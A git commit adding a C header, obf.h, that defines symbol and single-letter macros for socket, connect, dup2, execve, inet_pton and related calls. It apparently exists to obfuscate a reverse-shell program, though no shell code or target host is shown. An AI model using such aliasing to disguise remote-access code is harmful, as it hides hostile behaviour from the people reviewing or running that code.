5f3915b5eff0630e8e9b3034804af5a856ea97a8
1v4n <42386354+gaidardzhiev@users.noreply.github.com>
2024-09-08 10:28:43 +0300

    Add files via upload

---
+++ obf.h
@@ -0,0 +1,33 @@
+#ifndef OBF_H
+#define OBF_H
+#define ÷ char
+#define π int
+#define √ struct
+#define w main
+#define c argc
+#define v argv
+#define p fprintf
+#define s sock
+#define d dup2
+#define £ server
+#define e execve
+#define a socket
+#define b sockaddr
+#define k connect
+#define f perror
+#define q port
+#define m atoi
+#define x sockaddr_in
+#define g AF_INET
+#define j SOCK_STREAM
+#define ¥ htons
+#define ° inet_pton
+#define • sin_family
+#define r sin_port
+#define y sin_addr
+#define o ip
+#define ¢ stderr
+#define ¶ if
+#define ∆ return
+#define × sizeof
+#endif
